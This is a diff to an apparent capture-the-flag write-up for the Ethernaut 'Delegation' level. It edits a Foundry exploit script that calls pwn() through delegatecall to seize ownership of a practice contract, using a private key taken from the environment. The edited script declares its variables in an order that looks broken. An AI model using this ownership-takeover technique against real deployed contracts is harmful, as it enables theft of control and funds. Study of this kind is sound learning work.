@@ -234,18 +234,18 @@ contract DelegationTest is Test {
 ```solidity
 contract Exploit is Script {
 
+        Delegation level = Delegation(instance);   
         address instance = vm.envAddress("INSTANCE_LEVEL6");
-        Delegation level = Delegation(levelInstance);        
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);  
         
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-            
+            vm.startBroadcast(deployer);
             (bool success, ) = address(level).call(
                 abi.encodeWithSignature("pwn()")
             );
             require(success);
-            
             vm.stopBroadcast();
     }
 }
@@ -266,7 +266,7 @@ contract Exploit is Script {
 
 ---
 
-### solution using `cast`
+### alternative solution using `cast`
 
 <br>
 
